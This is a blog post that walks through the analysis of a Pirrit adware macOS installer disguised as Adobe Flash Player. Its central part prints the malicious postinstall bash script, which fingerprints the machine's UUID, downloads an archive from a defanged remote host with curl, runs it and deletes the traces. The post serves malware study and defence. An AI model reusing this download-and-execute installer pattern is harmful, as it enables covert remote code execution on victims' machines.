<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Analyzing a Pirrit adware installer" /><meta property="og:locale" content="en" /><meta name="description" content="While Windows holds the largest market share on malware, macOS has its fair share of threats that mostly exist in an adware/grayware area. In this post I want to walk through how a Pirrit PKG file installer works. There are lots of more complex threats, but this is a good place to start if you’re just jumping into analysis. If you want to follow along at home, I’m working with this file in MalwareBazaar: https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/." /><meta property="og:description" content="While Windows holds the largest market share on malware, macOS has its fair share of threats that mostly exist in an adware/grayware area. In this post I want to walk through how a Pirrit PKG file installer works. There are lots of more complex threats, but this is a good place to start if you’re just jumping into analysis. If you want to follow along at home, I’m working with this file in MalwareBazaar: https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/." /><link rel="canonical" href="https://forensicitguy.github.io/analyzing-pirrit-adware-installer/" /><meta property="og:url" content="https://forensicitguy.github.io/analyzing-pirrit-adware-installer/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-13T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Analyzing a Pirrit adware installer" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-13T00:00:00+00:00","datePublished":"2022-05-13T00:00:00+00:00","description":"While Windows holds the largest market share on malware, macOS has its fair share of threats that mostly exist in an adware/grayware area. In this post I want to walk through how a Pirrit PKG file installer works. There are lots of more complex threats, but this is a good place to start if you’re just jumping into analysis. If you want to follow along at home, I’m working with this file in MalwareBazaar: https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/.","headline":"Analyzing a Pirrit adware installer","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/analyzing-pirrit-adware-installer/"},"url":"https://forensicitguy.github.io/analyzing-pirrit-adware-installer/"}</script><title>Analyzing a Pirrit adware installer | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Tony Lambert</a></h1><p class="site-subtitle fst-italic mb-0">An educator that does security things</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener noreferrer" > <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Analyzing a Pirrit adware installer</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Analyzing a Pirrit adware installer</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1652400000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > May 13, 2022 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1624 words" > <em>9 min</em> read</span></div></div></div></header><div class="content"><p>While Windows holds the largest market share on malware, macOS has its fair share of threats that mostly exist in an adware/grayware area. In this post I want to walk through how a Pirrit PKG file installer works. There are lots of more complex threats, but this is a good place to start if you’re just jumping into analysis. If you want to follow along at home, I’m working with this file in MalwareBazaar: <a href="https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/">https://bazaar.abuse.ch/sample/d39426dbceb54bba51587242f8101184df43cc23af7dc7b364ca2327e28e7825/</a>.</p><h2 id="triaging-the-installer"><span class="me-2">Triaging the installer</span><a href="#triaging-the-installer" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>First, we need to verify we’re looking at a macOS installer file. To do this, we can use <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">diec</code>.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/pirrit$</span><span class="w"> </span>file FlashPlayer_01.0.pkg 
<span class="go">FlashPlayer_01.0.pkg: xar archive compressed TOC: 4540, SHA-1 checksum

</span><span class="gp">remnux@remnux:~/cases/pirrit$</span><span class="w"> </span>diec FlashPlayer_01.0.pkg 
<span class="go">Binary
    Archive: XAR
</span></pre></table></code></div></div><p>The macOS pkg installer file format is a <a href="https://en.wikipedia.org/wiki/.pkg">XAR archive</a>, so the output from both utilities jives with what I would expect. From here we have to extract the installer material.</p><h2 id="extracting-the-package-contents"><span class="me-2">Extracting the package contents</span><a href="#extracting-the-package-contents" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>To extract the package contents we can use <code class="language-plaintext highlighter-rouge">bsdtar</code> from the <code class="language-plaintext highlighter-rouge">libarchive-tools</code> Ubuntu Linux package. The usual <code class="language-plaintext highlighter-rouge">tar</code> utility doesn’t work for me, but the FreeBSD implementation in the package works.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/pirrit$</span><span class="w"> </span><span class="nb">mkdir </span>extracted
<span class="go">
</span><span class="gp">remnux@remnux:~/cases/pirrit$</span><span class="w"> </span>bsdtar xvf FlashPlayer_01.0.pkg <span class="nt">-C</span> extracted/
<span class="go">x Distribution
x Resources
x Resources/adobe_backgrounda.png
x Resources/en.lproj
x Resources/en.lproj/iem.html
x Resources/adobe_background.png
x base.pkg
x base.pkg/Payload
x base.pkg/Bom
x base.pkg/Scripts
x base.pkg/PackageInfo
</span></pre></table></code></div></div><p>After successfully extracting the files to the “extracted” folder, we can browse around the installer file’s contents. The first step will be inspecting the extracted <code class="language-plaintext highlighter-rouge">Distribution</code> file.</p><h2 id="inspecting-distribution"><span class="me-2">Inspecting Distribution</span><a href="#inspecting-distribution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The <code class="language-plaintext highlighter-rouge">Distribution</code> file contains details to help define and control the installation experience, which may include multiple packages within a single PKG file. In most case, the file is easily viewed in a text editor.</p><div file="Distribution" class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="Distribution"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;installer-script</span> <span class="na">minSpecVersion=</span><span class="s">"1.000000"</span> <span class="na">authoringTool=</span><span class="s">"com.apple.PackageMaker"</span> <span class="na">authoringToolVersion=</span><span class="s">"3.0.3"</span> <span class="na">authoringToolBuild=</span><span class="s">"174"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Install Wizz<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;options</span> <span class="na">customize=</span><span class="s">"never"</span> <span class="na">allow-external-scripts=</span><span class="s">"no"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;domains</span> <span class="na">enable_anywhere=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;installation-check</span> <span class="na">script=</span><span class="s">"pm_install_check();"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;script&gt;</span>function pm_install_check() {
  if(!(system.compareVersions(system.version.ProductVersion,'10.5') &gt;= 0)) {
    my.result.title = 'Failure';
    my.result.message = 'You need at least Mac OS X 10.5 to install Install Wizz products.';
    my.result.type = 'Fatal';
    return false;
  }
  return true;
}
<span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;background</span> <span class="na">file=</span><span class="s">"adobe_backgrounda.png"</span> <span class="na">alignment=</span><span class="s">"left"</span> <span class="na">scaling=</span><span class="s">"none"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;welcome</span> <span class="na">file=</span><span class="s">"iem.html"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;choices-outline&gt;</span>
        <span class="nt">&lt;line</span> <span class="na">choice=</span><span class="s">"choice1"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/choices-outline&gt;</span>
    <span class="nt">&lt;choice</span> <span class="na">id=</span><span class="s">"choice1"</span> <span class="na">title=</span><span class="s">"base"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;pkg-ref</span> <span class="na">id=</span><span class="s">"com.InstallWizz.base.pkg"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/choice&gt;</span>
    <span class="nt">&lt;pkg-ref</span> <span class="na">id=</span><span class="s">"com.InstallWizz.base.pkg"</span> <span class="na">installKBytes=</span><span class="s">"200"</span> <span class="na">version=</span><span class="s">"2.2.5"</span> <span class="na">auth=</span><span class="s">""</span><span class="nt">&gt;</span>#base.pkg<span class="nt">&lt;/pkg-ref&gt;</span>
<span class="nt">&lt;/installer-script&gt;</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">installer-script</code> tag gives some metadata regarding what tools created the installer file. In this case it looks like the authors possibly used <a href="http://s.sudre.free.fr/Stuff/PackageMaker_Howto.html">PackageMaker 3.0.3</a>. This metadata is possibly arbitrary because I’ve encountered <code class="language-plaintext highlighter-rouge">Distribution</code> files that don’t have it inside. The next interesting thing is the chunk of JavaScript code contained within the <code class="language-plaintext highlighter-rouge">script</code> tag and called by the <code class="language-plaintext highlighter-rouge">installation-check</code> tag. In this code, the developer defined a <code class="language-plaintext highlighter-rouge">pm_install_check()</code> which determines the current system’s macOS version using <a href="https://developer.apple.com/documentation/installer_js/system/1812284-version"><code class="language-plaintext highlighter-rouge">system.version.ProductVersion</code></a>. The version number is compared to 10.5 and the installation will only proceed if the version is later than that version. If the macOS version is older than Snow Leopard, the installation fails.</p><p>Finally, the <code class="language-plaintext highlighter-rouge">Distribution</code> file references a <code class="language-plaintext highlighter-rouge">base.pkg</code> package that will be applied to the system during installation. We saw some references to <code class="language-plaintext highlighter-rouge">base.pkg</code> during extraction, so let’s go check that out.</p><h2 id="examining-basepkg"><span class="me-2">Examining base.pkg</span><a href="#examining-basepkg" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Getting a directory listing for <code class="language-plaintext highlighter-rouge">base.pkg</code>, we can see a few files.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span>ll
<span class="go">total 24
drwxr-xr-x 2 remnux remnux 4096 Apr 29  2017 ./
drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../
-rw-r--r-- 1 remnux remnux 1022 Apr 29  2017 Bom
-rw-r--r-- 1 remnux remnux  394 Apr 29  2017 PackageInfo
-rw-r--r-- 1 remnux remnux  114 Apr 29  2017 Payload
-rw-r--r-- 1 remnux remnux  697 Apr 29  2017 Scripts
</span></pre></table></code></div></div><p>There are a few files here. First, <code class="language-plaintext highlighter-rouge">Bom</code> is a “bill of materials” file. This file is supposed to contain a list of files and things to touch during the installation and it doesn’t typically contain malicious code. One of the things on my “to-do” list is to write a tool I like to parse <code class="language-plaintext highlighter-rouge">Bom</code> files. The next interesting file is <code class="language-plaintext highlighter-rouge">PackageInfo</code>. This is a XML file that describes the contents of <code class="language-plaintext highlighter-rouge">base.pkg</code>.</p><div file="PackageInfo" class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="PackageInfo"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nt">&lt;pkg-info</span> <span class="na">format-version=</span><span class="s">"2"</span> <span class="na">identifier=</span><span class="s">"com.DataTech.base.pkg"</span> <span class="na">version=</span><span class="s">"1.3.0"</span> <span class="na">install-location=</span><span class="s">"/"</span> <span class="na">auth=</span><span class="s">""</span><span class="nt">&gt;</span>
  <span class="nt">&lt;payload</span> <span class="na">installKBytes=</span><span class="s">"200"</span> <span class="na">numberOfFiles=</span><span class="s">"2"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;scripts&gt;</span>
    <span class="nt">&lt;postinstall</span> <span class="na">file=</span><span class="s">"./postinstall"</span><span class="nt">/&gt;</span>
  <span class="nt">&lt;/scripts&gt;</span>
<span class="nt">&lt;bundle-version&gt;</span>
    <span class="nt">&lt;bundle</span> <span class="na">id=</span><span class="s">"com.DataTech"</span> <span class="na">CFBundleIdentifier=</span><span class="s">"com.DataTech"</span> <span class="na">path=</span><span class="s">"./Applications/DataTech.app"</span> <span class="na">CFBundleVersion=</span><span class="s">"1"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/bundle-version&gt;</span>
<span class="nt">&lt;/pkg-info&gt;</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">payload</code> tag has some metadata to show that the installed components are supposed to be 2 files totaling 200 KB in size. A payload size this small typically indicates that there isn’t much of any payload in the package at all, I’d expect there to be script content here rather than Mach-O binaries. The <code class="language-plaintext highlighter-rouge">scripts</code> tag specifies that we can expect a <code class="language-plaintext highlighter-rouge">postinstall</code> script to be present and execute during installation. In many cases you’ll also see a <code class="language-plaintext highlighter-rouge">preinstall</code> script. In legitimate installers these scripts are intended to prepare a system for installation and then clean up components afterward. In malicious installers, the scripts are usually used to establish persistence or download additional content.</p><p>Let’s jump over to inspect the package payload.</p><h2 id="extracting-and-analyzing-any-payloads"><span class="me-2">Extracting and analyzing any payloads</span><a href="#extracting-and-analyzing-any-payloads" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In macOS PKG files, the “payload” and “script” contents are stored within archives that are compressed using cpio and gzip. We can extract any contents pretty easily on the Linux command line.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span>file Payload 
<span class="go">Payload: gzip compressed data, last modified: Sat Apr 29 21:30:57 2017, from Unix, original size modulo 2^32 512

</span><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span><span class="nb">cat </span>Payload | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
<span class="go">1 block

</span><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span>ll
<span class="go">total 28
drwxr-xr-x 3 remnux remnux 4096 May 13 21:18 ./
drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../
drwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/
-rw-r--r-- 1 remnux remnux 1022 Apr 29  2017 Bom
-rw-r--r-- 1 remnux remnux  394 Apr 29  2017 PackageInfo
-rw-r--r-- 1 remnux remnux  114 Apr 29  2017 Payload
-rw-r--r-- 1 remnux remnux  697 Apr 29  2017 Scripts

</span><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span>tree <span class="nt">-a</span> Applications/
<span class="go">Applications/

0 directories, 0 files
</span></pre></table></code></div></div><p>The only thing within the package’s Payloads archive was an <code class="language-plaintext highlighter-rouge">Applications</code> folder, and it didn’t contain anything else. We can do something similar for the Scripts archive.</p><h2 id="extracting-and-analyzing-any-scripts"><span class="me-2">Extracting and analyzing any scripts</span><a href="#extracting-and-analyzing-any-scripts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Just like with Payloads, we can extract the contents of Scripts.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span><span class="nb">cat </span>Scripts | <span class="nb">gunzip</span> | cpio <span class="nt">-i</span>
<span class="go">4 blocks

</span><span class="gp">remnux@remnux:~/cases/pirrit/extracted/base.pkg$</span><span class="w"> </span>ll
<span class="go">total 56
drwxr-xr-x 3 remnux remnux 4096 May 13 21:21 ./
drwxrwxr-x 4 remnux remnux 4096 May 13 20:30 ../
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 66c1ffac-c020-4385-b6c8-a23192676f00
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 7d13cfd4-0ea8-423c-aaca-d9724d1ae3f4
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 8b84eaf8-a670-4cd9-b519-46725438c885
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 8d6b1599-5bd7-4043-918c-b67863e24970
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 a62f3b05-8125-4b5e-b035-e49985109b9a
drwxr-xr-x 2 remnux remnux 4096 May 13 21:17 Applications/
-rw-r--r-- 1 remnux remnux 1022 Apr 29  2017 Bom
-rw-r--r-- 1 remnux remnux   36 May 13 21:21 c45eb9d2-0c19-44b3-bdc1-7f936567f746
-rw-r--r-- 1 remnux remnux  394 Apr 29  2017 PackageInfo
-rw-r--r-- 1 remnux remnux  114 Apr 29  2017 Payload
-rwxr-xr-x 1 remnux remnux  756 May 13 21:21 postinstall*
-rw-r--r-- 1 remnux remnux  697 Apr 29  2017 Scripts
</span></pre></table></code></div></div><p>The Scripts archive contained multiple files that are named with GUIDs. Inside those files are GUID values that match the name of the file. They don’t seem to add anything to the experience here, so we can focus on the <code class="language-plaintext highlighter-rouge">postinstall</code> script itself.</p><div file="postinstall" class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="postinstall"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

func_act<span class="o">(){</span>
    <span class="nv">OS_Version</span><span class="o">=</span><span class="si">$(</span>sw_vers <span class="nt">-productVersion</span><span class="si">)</span>
    <span class="nv">mid</span><span class="o">=</span><span class="si">$(</span>ioreg <span class="nt">-rd1</span> <span class="nt">-c</span> IOPlatformExpertDevice | <span class="nb">awk</span> <span class="s1">'/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }'</span><span class="si">)</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="k">${</span><span class="nv">OS_Version</span><span class="k">}</span> <span class="o">==</span> <span class="k">*</span><span class="s2">"10.12"</span><span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
      /usr/bin/curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-o</span> /var/tmp/act.tgz <span class="s2">"hxxp://c.firstinstallmac[.]club/is/cact?i="</span>413cc336-95fb-4d47-aa10-d4f06f790e1c<span class="s2">"&amp;ve=10.12&amp;id=</span><span class="nv">$mid</span><span class="s2">"</span>
    <span class="k">else</span>
      /usr/bin/curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nt">-o</span> /var/tmp/act.tgz <span class="s2">"hxxp://c.firstinstallmac[.]club/is/cact?i="</span>413cc336-95fb-4d47-aa10-d4f06f790e1c<span class="s2">"&amp;id=</span><span class="nv">$mid</span><span class="s2">"</span>
    <span class="k">fi
    </span><span class="nb">tar</span> <span class="nt">-xzf</span> /var/tmp/act.tgz <span class="nt">-C</span> /var/tmp
    /var/tmp/act/act <span class="s2">"2712c147-7e15-4366-80e0-4c7b98d780f0"</span> <span class="s2">"413cc336-95fb-4d47-aa10-d4f06f790e1c"</span>
    <span class="nb">sleep </span>120
    <span class="nb">rm</span> <span class="nt">-rf</span> /var/tmp/act/act
    <span class="nb">rm</span> <span class="nt">-rf</span> /var/tmp/act.tgz
<span class="o">}</span>
func_act &amp;
</pre></table></code></div></div><p>The script defines a function <code class="language-plaintext highlighter-rouge">func_act()</code> which downloads and executes arbitrary content from a remote URL. The first few lines grab the macOS version using <code class="language-plaintext highlighter-rouge">sw_vers</code> and the affected system’s UUID using <code class="language-plaintext highlighter-rouge">ioreg</code>. If macOS version on the affected system is running 10.12 (Sierra) a specific parameter is added to the URL called by <code class="language-plaintext highlighter-rouge">curl</code>. No matter the version, however, the script downloads an <code class="language-plaintext highlighter-rouge">act.tgz</code> file from <code class="language-plaintext highlighter-rouge">c.firstinstallmac[.]club</code> and writes it to disk. The script then unpacks it to <code class="language-plaintext highlighter-rouge">/var/tmp/act</code>. Finally, the script executes the process <code class="language-plaintext highlighter-rouge">/var/tmp/act/act</code>, feeding some UID values to it as arguments before sleeping and then removing all the contents downloaded.</p><p>After executing, the contents from <code class="language-plaintext highlighter-rouge">postinstall</code> should not exist on the affected system anymore.</p><h2 id="script-only-packages"><span class="me-2">Script-only packages</span><a href="#script-only-packages" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This installer package is an example of something I’ve seen across Pirrit and WizardUpdate adware families: script-only packages. In these cases, no actual binary content exists in the installer files, and all the executable content is downloaded via a script. I’m not really sure why developers do this, but I suspect it’s related to evading static signatures or allowing the adversary to distribute one single installer while the actual adware/malware downloaded can change out on demand.</p><h2 id="masquerading-as-adobe"><span class="me-2">Masquerading as Adobe</span><a href="#masquerading-as-adobe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Before stopping for the night, I want to cover something that is potentially concerning for victims and for legitimate software developers. In this instance of malware and many others, the developer masquerades the installer to pose as an Adobe product. This is seen in an HTML file displayed during the installation that claims to be associated with “Flash Player” and a background image using an Adobe logo.</p><p><a href="/assets/images/analyzing-pirrit-adware-installer/adobe_masquerading.png" class="popup img-link shimmer"><img src="/assets/images/analyzing-pirrit-adware-installer/adobe_masquerading.png" alt="Masquerading as Adobe" loading="lazy"></a></p><p>This is even potentially an avenue that developers can use to fight adware, because this stuff definitely isn’t associated with Adobe in any way. Thank you for reading!</p></div><div class="post-tail-wrapper 